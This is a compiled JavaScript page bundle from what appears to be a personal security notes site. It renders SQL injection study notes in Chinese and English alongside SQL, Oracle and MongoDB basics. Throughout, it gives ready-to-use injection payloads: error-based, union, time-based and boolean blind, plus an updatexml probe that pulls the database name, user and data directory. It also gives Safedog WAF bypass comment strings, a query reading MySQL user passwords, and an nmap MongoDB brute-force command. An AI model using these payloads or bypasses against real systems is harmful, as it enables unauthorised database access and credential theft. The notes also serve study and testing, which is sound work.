import{_ as n,K as s,L as a,W as p}from"./framework-edebdfe1.js";const e={},t=p(`<h1 id="tmp" tabindex="-1"><a class="header-anchor" href="#tmp" aria-hidden="true">#</a> TMP</h1><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code>Different DB <span class="token punctuation">,</span> Different syntax <span class="token operator">=</span><span class="token operator">&gt;</span> SQL
Easy2Sqlmap<span class="token punctuation">,</span>Hard2Bypass

框架过滤，WAF流量过滤

Framework <span class="token operator">&amp;</span> Waf

laravel  pdo function 
regex
\\b<span class="token punctuation">(</span>ALTER<span class="token operator">|</span>CREATE<span class="token operator">|</span>DELETE<span class="token operator">|</span>DROP<span class="token operator">|</span>EXEC<span class="token punctuation">(</span>UTE<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token operator">|</span>INSERT<span class="token punctuation">(</span> <span class="token operator">+</span>INTO<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token operator">|</span>MERGE<span class="token operator">|</span>SELECT<span class="token operator">|</span>UPDATE<span class="token operator">|</span>UNION<span class="token punctuation">(</span> <span class="token operator">+</span>ALL<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span>\\b

waf safedog <span class="token builtin">bin</span> dump rules
regex

waf<span class="token operator">-</span><span class="token builtin">filter</span><span class="token punctuation">:</span>
regex <span class="token operator">|</span> eng rules <span class="token operator">|</span> ml

<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">4</span><span class="token string">&#39; AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7178787671,(SELECT (ELT(2556=2556,1))),0x71627a6a71,0x78))s), 8446744073709551610, 8446744073709551610))) AND &#39;</span>JOtO<span class="token string">&#39;=&#39;</span>JOtO

php?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">200</span>&#39;<span class="token operator">+</span><span class="token keyword">and</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token operator">*</span>60000select<span class="token operator">*</span><span class="token operator">/</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token operator">*</span>!32001select<span class="token operator">*</span><span class="token operator">/</span><span class="token number">0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">and</span> <span class="token number">0</span> union select <span class="token number">1</span><span class="token punctuation">,</span> version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span> <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span>

已知规则源码，逆向分析
<span class="token punctuation">(</span>\\b<span class="token operator">|</span>\\\\N<span class="token operator">|</span>\\d<span class="token operator">*</span><span class="token punctuation">(</span>e\\s?<span class="token operator">|</span>e\\<span class="token operator">-</span><span class="token operator">|</span>e\\<span class="token operator">+</span><span class="token punctuation">)</span>\\d<span class="token operator">+</span><span class="token operator">|</span>\\d<span class="token operator">+</span>\\<span class="token punctuation">.</span>\\d<span class="token operator">*</span><span class="token operator">|</span>\\d<span class="token operator">*</span>\\<span class="token punctuation">.</span>\\d<span class="token operator">+</span><span class="token operator">|</span>\\d<span class="token operator">*</span><span class="token punctuation">)</span>union<span class="token punctuation">(</span>\\s<span class="token operator">*</span>\\S<span class="token operator">+</span><span class="token operator">|</span><span class="token punctuation">(</span>\\s<span class="token operator">+</span>\\w<span class="token operator">+</span>\\s<span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token operator">|</span>\\s<span class="token operator">+</span><span class="token builtin">all</span><span class="token operator">|</span>\\s<span class="token operator">+</span>distinctrow<span class="token operator">|</span>\\s<span class="token operator">+</span>distinct<span class="token operator">|</span>\\<span class="token punctuation">(</span><span class="token operator">*</span><span class="token operator">|</span>\\s<span class="token operator">*</span>\\S<span class="token operator">+</span>\\s<span class="token operator">*</span>\\S<span class="token operator">+</span><span class="token punctuation">)</span><span class="token punctuation">(</span>\\s<span class="token operator">+</span><span class="token operator">|</span><span class="token punctuation">[</span>\\<span class="token punctuation">(</span>\\s<span class="token punctuation">]</span><span class="token operator">*</span><span class="token punctuation">)</span>select<span class="token punctuation">.</span><span class="token operator">*</span>

<span class="token punctuation">(</span>\\<span class="token punctuation">)</span><span class="token operator">|</span>\\b<span class="token operator">|</span>\\d<span class="token operator">+</span><span class="token punctuation">)</span>order<span class="token punctuation">(</span><span class="token comment">#*\\s+\\S*\\s*\\S*\\s*)by\\b</span>

<span class="token punctuation">(</span><span class="token comment">#|;|&#39;|\\)|\\d|\\s)+(\\s*/*\\s*)(\\band\\b|\\bor\\b|\\bhaving\\b|&amp;&amp;|&amp;|\\bxor\\b)(\\s*/*\\s*)(#|\\s|!|\\()*!*-*&#39;*(false|true|\\d+|\\(ascii.{1,20}=|\\(length.{1,20}=)\\b</span>
Fuzz <span class="token punctuation">(</span>rules<span class="token punctuation">)</span>

x x x <span class="token operator">=</span><span class="token operator">&gt;</span> x
<span class="token number">1</span> x <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">0.5</span>

Sqli<span class="token operator">-</span>Labs<span class="token punctuation">:</span>
how to install<span class="token punctuation">:</span>
sudo docker run <span class="token operator">-</span>dt <span class="token operator">-</span><span class="token operator">-</span>name sqli <span class="token operator">-</span>p <span class="token number">80</span><span class="token punctuation">:</span><span class="token number">80</span> <span class="token operator">-</span><span class="token operator">-</span>rm acgpiano<span class="token operator">/</span>sqli<span class="token operator">-</span>labs

Sqlmap<span class="token punctuation">:</span>
https<span class="token punctuation">:</span><span class="token operator">//</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>needle<span class="token operator">-</span>wang<span class="token operator">/</span>sqlmap<span class="token operator">-</span>gtk

Prerequisites
python3<span class="token punctuation">.</span><span class="token number">6</span><span class="token operator">+</span><span class="token punctuation">,</span> GTK<span class="token operator">+</span><span class="token number">3.20</span> above<span class="token punctuation">(</span>linux has contained<span class="token punctuation">)</span>
pygobject<span class="token punctuation">:</span> <span class="token punctuation">(</span>choose one<span class="token punctuation">)</span>
apt<span class="token operator">-</span>get install python3<span class="token operator">-</span>gi<span class="token punctuation">(</span>suggestion<span class="token punctuation">)</span>
pip3 install PyGObject
requests<span class="token punctuation">:</span> pip3 install requests

找可能的注入点：

get index<span class="token punctuation">.</span>html

后端有交互的点
request method get post  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
get<span class="token operator">/</span>post<span class="token operator">/</span>header

index<span class="token punctuation">.</span>php?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span>&#39; <span class="token keyword">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span>user<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span>@@datadir<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#</span>


google dork
SqlInjectType<span class="token punctuation">:</span> 
In<span class="token operator">-</span>band SQLi <span class="token punctuation">(</span>Classic SQLi<span class="token punctuation">)</span>
Error<span class="token operator">-</span>based SQLi
<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">4</span><span class="token string">&#39; AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7178787671,(SELECT (ELT(2556=2556,1))),0x71627a6a71,0x78))s), 8446744073709551610, 8446744073709551610))) AND &#39;</span>JOtO<span class="token string">&#39;=&#39;</span>JOtO
Union<span class="token operator">-</span>based SQLi
<span class="token builtin">id</span><span class="token operator">=</span><span class="token operator">-</span><span class="token number">7810</span>&#39; UNION ALL SELECT NULL<span class="token punctuation">,</span>CONCAT<span class="token punctuation">(</span><span class="token number">0x7171627a71</span><span class="token punctuation">,</span><span class="token number">0x415449484d526167596a77484c6e47775644794b4b7048756b6b47746472536a4c58694471634d65</span><span class="token punctuation">,</span><span class="token number">0x7171787171</span><span class="token punctuation">)</span><span class="token punctuation">,</span>NULL<span class="token operator">-</span><span class="token operator">-</span>
Time<span class="token operator">-</span>based Blind SQLi
<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">4</span><span class="token string">&#39; AND (SELECT 5114 FROM (SELECT(SLEEP(2))) AS RezN) AND &#39;</span>vULj<span class="token string">&#39;=&#39;</span>vULj
Boolean<span class="token operator">-</span>based Blind SQLi
<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span><span class="token string">&#39; AND 5957=5957 AND &#39;</span>DFUZ<span class="token string">&#39;=&#39;</span>DFUZ
Stacked injections
<span class="token punctuation">;</span>
SQL<span class="token punctuation">:</span>
數據類型：
https<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>w3schools<span class="token punctuation">.</span>com<span class="token operator">/</span>sql<span class="token operator">/</span>sql_datatypes<span class="token punctuation">.</span>asp

注释：
<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span> OR SLEEP<span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">0</span> LIMIT <span class="token number">1</span><span class="token operator">-</span><span class="token operator">-</span>
<span class="token operator">-</span><span class="token operator">-</span>
<span class="token operator">/</span><span class="token operator">**</span><span class="token operator">/</span>

创建数据库：
CREATE DATABASE databasename<span class="token punctuation">;</span>

删除数据库：
DROP DATABASE databasename<span class="token punctuation">;</span>

数据库备份：
BACKUP DATABASE databasename
TO DISK <span class="token operator">=</span> <span class="token string">&#39;filepath&#39;</span><span class="token punctuation">;</span>

数据库差异备份：
BACKUP DATABASE databasename
TO DISK <span class="token operator">=</span> <span class="token string">&#39;filepath&#39;</span>
WITH DIFFERENTIAL<span class="token punctuation">;</span>

创建表：
CREATE TABLE table_name <span class="token punctuation">(</span>
	column1 datatype<span class="token punctuation">,</span>
	column2 datatype<span class="token punctuation">,</span>
	column3 datatype<span class="token punctuation">,</span>
   <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>

CREATE TABLE duser<span class="token punctuation">(</span><span class="token builtin">id</span> <span class="token builtin">int</span><span class="token punctuation">,</span>username VARCHAR<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">pass</span> VARCHAR<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

删除表：
DROP TABLE table_name<span class="token punctuation">;</span>

增删改表：
ALTER TABLE table_name
ADD column_name datatype<span class="token punctuation">;</span>

ALTER TABLE table_name
DROP COLUMN column_name<span class="token punctuation">;</span>

ALTER TABLE table_name
MODIFY COLUMN column_name datatype<span class="token punctuation">;</span>

ALTER TABLE table_name
MODIFY column_name datatype<span class="token punctuation">;</span>

ALTER TABLE table_name
ALTER COLUMN column_name datatype<span class="token punctuation">;</span>

插入数据：
INSERT INTO table_name <span class="token punctuation">(</span>column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> column3<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>
VALUES <span class="token punctuation">(</span>value1<span class="token punctuation">,</span> value2<span class="token punctuation">,</span> value3<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

INSERT INTO deelmind<span class="token punctuation">.</span>duser<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">,</span>username<span class="token punctuation">,</span><span class="token keyword">pass</span><span class="token punctuation">)</span> VALUES<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">&quot;username3&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;pass3&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

INSERT INTO table2 <span class="token punctuation">(</span>column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> column3<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>
SELECT column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> column3<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
FROM table1
WHERE condition<span class="token punctuation">;</span>

更新数据：
UPDATE table_name
SET column1 <span class="token operator">=</span> value1<span class="token punctuation">,</span> column2 <span class="token operator">=</span> value2<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
WHERE condition<span class="token punctuation">;</span>

查询数据：
SELECT <span class="token operator">*</span> FROM X
SELECT DISTINCT <span class="token operator">*</span> FROM X  去重
SELECT <span class="token operator">*</span> FROME WHERE

Where<span class="token punctuation">:</span>
运算符	描述
<span class="token operator">=</span>	等于
<span class="token operator">&lt;&gt;</span>	不等于。注释：在 SQL 的一些版本中，该操作符可被写成 <span class="token operator">!=</span>
<span class="token operator">&gt;</span>	大于
<span class="token operator">&lt;</span>	小于
<span class="token operator">&gt;=</span>	大于等于
<span class="token operator">&lt;=</span>	小于等于
BETWEEN	在某个范围内
LIKE	搜索某种模式
IN	指定针对某个列的多个可能值

ORDER BY 
FUNCTIONS count <span class="token builtin">min</span> <span class="token builtin">max</span> <span class="token builtin">sum</span> …
AS
EXISTS
JOIN
ONION
SELECT DISTINCT
WHERE
AND <span class="token operator">&amp;</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span>
OR <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">|</span>
<span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span>
Mysql<span class="token punctuation">:</span>
注释：
<span class="token comment">#</span>

登录：
mysql <span class="token operator">-</span>h ip <span class="token operator">-</span>u user <span class="token operator">-</span>p <span class="token keyword">pass</span>

select top<span class="token punctuation">:</span>
limit number


常量：
显示版本：select version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
显示字符集：select @@character_set_database<span class="token punctuation">;</span>
显示计算机名：select @@hostname<span class="token punctuation">;</span>
显示系统版本：select @@version_compile_os<span class="token punctuation">;</span>
显示mysql路径：select @@basedir<span class="token punctuation">;</span>
显示数据库路径：select @@datadir<span class="token punctuation">;</span>
显示root密码：select User<span class="token punctuation">,</span>Password <span class="token keyword">from</span> mysql<span class="token punctuation">.</span>user<span class="token punctuation">;</span>

联合注入：
报错注入：
布尔盲注：
时间盲注：
其它注入：
OOB<span class="token punctuation">:</span> out of band
unc
http<span class="token punctuation">:</span><span class="token operator">//</span>dnslog<span class="token punctuation">.</span>cn<span class="token operator">/</span>

正则表达式：
https<span class="token punctuation">:</span><span class="token operator">//</span>regex101<span class="token punctuation">.</span>com<span class="token operator">/</span>


Bypass<span class="token punctuation">:</span>
safedog<span class="token punctuation">:</span>

dump rules
view rules
bypass
filters url <span class="token operator">&gt;</span> IsSqlInjection<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">and</span><span class="token operator">/</span><span class="token operator">*</span><span class="token operator">%</span>&quot;!<span class="token operator">/</span><span class="token operator">*</span><span class="token operator">/</span>

<span class="token builtin">filter</span>

<span class="token keyword">and</span><span class="token operator">/</span>

<span class="token keyword">and</span> 

<span class="token operator">/</span><span class="token operator">*</span><span class="token operator">%</span><span class="token string">&quot;!/*/and/*%&quot;</span>!<span class="token operator">/</span><span class="token operator">*</span><span class="token operator">/</span>
<span class="token operator">/</span><span class="token operator">*</span><span class="token operator">%</span>&quot;<span class="token operator">/</span>!<span class="token operator">*</span><span class="token operator">/</span>select
<span class="token operator">/</span><span class="token operator">*</span><span class="token operator">%</span><span class="token operator">/</span>!&quot;<span class="token operator">*</span><span class="token operator">/</span>union
<span class="token operator">/</span><span class="token operator">*</span><span class="token operator">%</span><span class="token operator">/</span>&quot;!<span class="token operator">*</span><span class="token operator">/</span>sleep<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">/</span><span class="token operator">*</span>!<span class="token operator">%</span>&quot;<span class="token operator">/</span><span class="token operator">*</span><span class="token operator">/</span>
<span class="token operator">/</span><span class="token operator">*</span>!<span class="token operator">%</span><span class="token operator">/</span>&quot;<span class="token operator">*</span><span class="token operator">/</span>
<span class="token operator">/</span><span class="token operator">*</span>!&quot;<span class="token operator">%</span><span class="token operator">/</span><span class="token operator">*</span><span class="token operator">/</span>
<span class="token operator">/</span><span class="token operator">*</span>!&quot;<span class="token operator">/</span><span class="token operator">%</span><span class="token operator">*</span><span class="token operator">/</span>
<span class="token operator">/</span><span class="token operator">*</span>!<span class="token operator">/</span><span class="token operator">%</span>&quot;<span class="token operator">*</span><span class="token operator">/</span>
<span class="token operator">/</span><span class="token operator">*</span>!<span class="token operator">/</span>&quot;<span class="token operator">%</span><span class="token operator">*</span><span class="token operator">/</span>
<span class="token operator">/</span><span class="token operator">*</span>&quot;<span class="token operator">%</span>!<span class="token operator">/</span><span class="token operator">*</span><span class="token operator">/</span>
<span class="token operator">/</span><span class="token operator">*</span>&quot;<span class="token operator">%</span><span class="token operator">/</span>!<span class="token operator">*</span><span class="token operator">/</span>
<span class="token operator">/</span><span class="token operator">*</span>&quot;!<span class="token operator">%</span><span class="token operator">/</span><span class="token operator">*</span><span class="token operator">/</span>
<span class="token operator">/</span><span class="token operator">*</span>&quot;!<span class="token operator">/</span><span class="token operator">%</span><span class="token operator">*</span><span class="token operator">/</span>


二次注入：
https<span class="token punctuation">:</span><span class="token operator">//</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>HoangKien1020<span class="token operator">/</span>Joomla<span class="token operator">-</span>SQLinjection


参数污染：

Web Application Server Backend	Parsing Result	Example
ASP<span class="token punctuation">.</span>NET <span class="token operator">/</span> IIS	All occurrences concatenated <span class="token keyword">with</span> a comma	color<span class="token operator">=</span>red<span class="token punctuation">,</span>blue
ASP <span class="token operator">/</span> IIS	All occurrences concatenated <span class="token keyword">with</span> a comma	color<span class="token operator">=</span>red<span class="token punctuation">,</span>blue
<span class="token punctuation">.</span>NET Core <span class="token number">3.1</span> <span class="token operator">/</span> Kestrel	All occurrences concatenated <span class="token keyword">with</span> a comma	color<span class="token operator">=</span>red<span class="token punctuation">,</span>blue
<span class="token punctuation">.</span>NET <span class="token number">5</span> <span class="token operator">/</span> Kestrel	All occurrences concatenated <span class="token keyword">with</span> a comma	color<span class="token operator">=</span>red<span class="token punctuation">,</span>blue
PHP <span class="token operator">/</span> Apache	Last occurrence only	color<span class="token operator">=</span>blue
PHP <span class="token operator">/</span> Zeus	Last occurrence only	color<span class="token operator">=</span>blue
JSP<span class="token punctuation">,</span> Servlet <span class="token operator">/</span> Apache Tomcat	First occurrence only	color<span class="token operator">=</span>red
JSP<span class="token punctuation">,</span> Servlet <span class="token operator">/</span> Oracle Application Server 10g	First occurrence only	color<span class="token operator">=</span>red
JSP<span class="token punctuation">,</span> Servlet <span class="token operator">/</span> Jetty	First occurrence only	color<span class="token operator">=</span>red
IBM Lotus Domino	Last occurrence only	color<span class="token operator">=</span>blue
IBM HTTP Server	First occurrence only	color<span class="token operator">=</span>red
node<span class="token punctuation">.</span>js <span class="token operator">/</span> express	First occurence only	color<span class="token operator">=</span>red
mod_perl<span class="token punctuation">,</span> libapreq2 <span class="token operator">/</span> Apache	First occurrence only	color<span class="token operator">=</span>red
Perl CGI <span class="token operator">/</span> Apache	First occurrence only	color<span class="token operator">=</span>red
mod_wsgi <span class="token punctuation">(</span>Python<span class="token punctuation">)</span> <span class="token operator">/</span> Apache	First occurrence only	color<span class="token operator">=</span>red
Python <span class="token operator">/</span> Zope	All occurrences <span class="token keyword">in</span> List data <span class="token builtin">type</span>	color<span class="token operator">=</span><span class="token punctuation">[</span>‘red’<span class="token punctuation">,</span>’blue’<span class="token punctuation">]</span>



https<span class="token punctuation">:</span><span class="token operator">//</span>vimeo<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token number">398763205</span>

绕过<span class="token operator">&amp;</span>总结：
sqlmap critical
加tamper

不同SQL语句
空字符
宽字符
冗余流量
注释 <span class="token operator">/</span><span class="token operator">*</span>  <span class="token operator">*</span><span class="token operator">/</span>  <span class="token operator">-</span><span class="token operator">-</span> <span class="token comment"># </span>
inline注释 <span class="token operator">/</span><span class="token operator">*</span>!version  code  <span class="token operator">*</span><span class="token operator">/</span>
URL encode
‘ <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token operator">%</span>df<span class="token operator">%</span><span class="token number">27</span>
addslashes
mysql_real_escape_string


https<span class="token punctuation">:</span><span class="token operator">//</span>docs<span class="token punctuation">.</span>google<span class="token punctuation">.</span>com<span class="token operator">/</span>document<span class="token operator">/</span>d<span class="token operator">/</span>1b4ggz9ijhu0TJ_3F4ncgPxpbZKVedtpDiqKB9R40sXM<span class="token operator">/</span>edit<span class="token comment">#heading=h.cxf4xsbdot3s</span>

Sql Server<span class="token punctuation">:</span>
查询数据库
select <span class="token operator">*</span> <span class="token keyword">from</span> sysdatabases<span class="token punctuation">;</span>
use dbname<span class="token punctuation">;</span>

查询表
select <span class="token operator">*</span> <span class="token keyword">from</span> sysobjects where xtype<span class="token operator">=</span><span class="token string">&#39;U&#39;</span><span class="token punctuation">;</span>
xtype<span class="token operator">=</span><span class="token string">&#39;U&#39;</span><span class="token punctuation">:</span>表示所有用户表，xtype<span class="token operator">=</span><span class="token string">&#39;S&#39;</span><span class="token punctuation">:</span>表示所有系统表。

select top<span class="token punctuation">:</span>
top number

Oracle<span class="token punctuation">:</span>
登录：
sqlplus <span class="token operator">/</span>nolog
connect SYS <span class="token keyword">as</span> sysdba
show user

创建数据库：
CREATE TABLESPACE data01
DATAFILE <span class="token string">&#39;database.dbf&#39;</span> SIZE 500M

由于Oralce没有库名<span class="token punctuation">,</span>只有表空间<span class="token punctuation">,</span>所以Oracle没有提供数据库名称查询支持，只提供了表空间名称查询<span class="token punctuation">:</span>
select <span class="token operator">*</span> <span class="token keyword">from</span> v$tablespace<span class="token punctuation">;</span>
select instance_name <span class="token keyword">from</span> v$instance<span class="token punctuation">;</span> <span class="token operator">//</span>查看当前使用的数据库

查询当前数据库中所有表名<span class="token punctuation">:</span>
select <span class="token operator">*</span> <span class="token keyword">from</span> user_tables<span class="token punctuation">;</span>

查看用户权限：
select <span class="token operator">*</span> <span class="token keyword">from</span> dba_roles<span class="token punctuation">;</span>

Select Top<span class="token punctuation">:</span>
ORDER BY <span class="token builtin">id</span> FETCH FIRST <span class="token number">1</span> ROWS ONLY

Sqlilab<span class="token punctuation">:</span>
$<span class="token builtin">id</span> <span class="token operator">=</span> <span class="token string">&#39;&quot;&#39;</span><span class="token punctuation">.</span>$<span class="token builtin">id</span><span class="token punctuation">.</span><span class="token string">&#39;&quot;&#39;</span><span class="token punctuation">;</span>
$sql<span class="token operator">=</span><span class="token string">&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;</span><span class="token punctuation">;</span>

SELECT <span class="token operator">*</span> FROM users WHERE <span class="token builtin">id</span><span class="token operator">=</span><span class="token string">&quot;and 1=1&quot;</span> LIMIT <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span>



NoSql<span class="token punctuation">:</span>


show databases<span class="token punctuation">;</span>
show dbs<span class="token punctuation">;</span>

use db<span class="token punctuation">;</span>

show tables<span class="token punctuation">;</span>
show collections<span class="token punctuation">;</span>


use test<span class="token punctuation">;</span>
db<span class="token punctuation">.</span>admin<span class="token punctuation">.</span>insert<span class="token punctuation">(</span> <span class="token punctuation">{</span> <span class="token builtin">id</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">,</span>name<span class="token punctuation">:</span><span class="token string">&quot;name1&quot;</span><span class="token punctuation">,</span>age<span class="token punctuation">:</span><span class="token number">1</span> <span class="token punctuation">}</span> <span class="token punctuation">)</span>
db<span class="token punctuation">.</span>admin<span class="token punctuation">.</span>insertOne<span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token builtin">id</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">,</span>name<span class="token punctuation">:</span><span class="token string">&quot;name2&quot;</span><span class="token punctuation">,</span>age<span class="token punctuation">:</span><span class="token number">2</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>
db<span class="token punctuation">.</span>admin<span class="token punctuation">.</span>insertMany<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">{</span> <span class="token builtin">id</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">,</span>name<span class="token punctuation">:</span><span class="token string">&quot;name3&quot;</span><span class="token punctuation">,</span>age<span class="token punctuation">:</span><span class="token number">3</span> <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span> <span class="token builtin">id</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">,</span>name<span class="token punctuation">:</span><span class="token string">&quot;name4&quot;</span><span class="token punctuation">,</span>age<span class="token punctuation">:</span><span class="token number">4</span> <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

db<span class="token punctuation">.</span>admin<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token punctuation">)</span>
db<span class="token punctuation">.</span>admin<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token builtin">id</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
db<span class="token punctuation">.</span>admin<span class="token punctuation">.</span>findOne<span class="token punctuation">(</span><span class="token punctuation">)</span>

db<span class="token punctuation">.</span>admin<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token builtin">id</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
db<span class="token punctuation">.</span>admin<span class="token punctuation">.</span>deleteOne<span class="token punctuation">(</span><span class="token punctuation">)</span>
db<span class="token punctuation">.</span>admin<span class="token punctuation">.</span>deleteMany<span class="token punctuation">(</span><span class="token punctuation">)</span>

db<span class="token punctuation">.</span>admin<span class="token punctuation">.</span>drop<span class="token punctuation">(</span><span class="token punctuation">)</span>

db<span class="token punctuation">.</span>user<span class="token punctuation">.</span>update<span class="token punctuation">(</span> <span class="token punctuation">{</span><span class="token string">&quot;name&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;name1&quot;</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>$<span class="token builtin">set</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>age<span class="token punctuation">:</span><span class="token number">99</span><span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>
db<span class="token punctuation">.</span>user<span class="token punctuation">.</span>updateMany<span class="token punctuation">(</span> <span class="token punctuation">{</span><span class="token string">&quot;name&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;name1&quot;</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>$<span class="token builtin">set</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>age<span class="token punctuation">:</span><span class="token number">99</span><span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>

db<span class="token punctuation">.</span>dropDatabase<span class="token punctuation">(</span><span class="token punctuation">)</span>

https<span class="token punctuation">:</span><span class="token operator">//</span>docs<span class="token punctuation">.</span>mongodb<span class="token punctuation">.</span>com<span class="token operator">/</span>manual<span class="token operator">/</span>reference<span class="token operator">/</span>method<span class="token operator">/</span>db<span class="token punctuation">.</span>createUser<span class="token operator">/</span>

db<span class="token punctuation">.</span>createUser<span class="token punctuation">(</span> <span class="token punctuation">{</span>user<span class="token punctuation">:</span> <span class="token string">&quot;admin&quot;</span><span class="token punctuation">,</span>pwd<span class="token punctuation">:</span> <span class="token string">&quot;123456&quot;</span><span class="token punctuation">,</span>roles<span class="token punctuation">:</span> <span class="token punctuation">[</span> <span class="token punctuation">{</span> role<span class="token punctuation">:</span> <span class="token string">&quot;userAdminAnyDatabase&quot;</span><span class="token punctuation">,</span> db<span class="token punctuation">:</span> <span class="token string">&quot;admin&quot;</span> <span class="token punctuation">}</span> <span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
use admin
db<span class="token punctuation">.</span>auth<span class="token punctuation">(</span><span class="token string">&quot;admin&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;123456&quot;</span><span class="token punctuation">)</span>


暴力破解：

nmap <span class="token operator">-</span>p <span class="token number">27017</span> <span class="token operator">&lt;</span>ip<span class="token operator">&gt;</span> <span class="token operator">-</span><span class="token operator">-</span>script mongodb<span class="token operator">-</span>brute
Script Output
PORT      STATE SERVICE
<span class="token number">27017</span><span class="token operator">/</span>tcp <span class="token builtin">open</span>  mongodb
